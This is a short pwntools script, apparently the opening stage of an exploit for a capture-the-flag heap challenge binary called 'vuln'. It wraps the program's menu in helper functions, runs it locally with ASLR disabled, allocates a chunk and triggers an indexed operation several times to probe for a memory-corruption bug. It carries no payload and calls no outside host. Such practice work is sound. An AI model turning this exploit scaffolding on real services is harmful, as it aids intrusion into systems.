#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln', checksec = False)

p = process(exe.path, aslr=False)
# p = remote('', )

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size))
    p.sendlineafter(b'content: ', data)

def delete():
    p.sendlineafter(b'> ', b'2')

def multi(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx))

input()
create(32, b'a'*31)
multi(0)
multi(5)
multi(10)

p.interactive()